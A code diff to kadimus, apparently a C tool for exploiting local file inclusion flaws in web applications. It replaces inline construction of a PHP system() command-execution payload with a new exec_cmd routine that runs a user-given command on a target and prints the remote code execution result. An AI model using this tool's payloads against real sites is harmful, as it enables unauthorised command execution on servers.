@@ -21,6 +21,7 @@
 #include "techniques/php-filter.h"
 #include "fun/exec-php-code.h"
 #include "fun/http-shell.h"
+#include "fun/exec-cmd.h"
 
 static const struct option long_options[] = {
 	{"help", no_argument, 0, 'h'},
@@ -365,7 +366,6 @@ void init_global_structs(struct kadimus_opts *opts)
 int kadimus(struct kadimus_opts *opts)
 {
 	pid_t pid;
-	char *cmd;
 
 	if (opts->scan && opts->url)
 		kadimus_scan(opts->url);
@@ -396,10 +396,16 @@ int kadimus(struct kadimus_opts *opts)
 
 
 	if (opts->cmd) {
-		xmalloc(cmd, strlen(opts->cmd)+21);
-		sprintf(cmd, "<?php system(\"%s\"); ?>", opts->cmd);
-		exec_code(opts->url, opts->parameter, cmd, opts->technique);
-		free(cmd);
+		xinfo("trying exec code ...\n");
+		char *rce = exec_cmd(opts->url, opts->parameter, opts->cmd, opts->technique);
+
+		xinfo("result:\n");
+		if (rce) {
+			printf("%s\n", rce);
+			free(rce);
+		} else {
+			xerror("nothing to show!\n");
+		}
 	}
 
 	if (opts->connect)
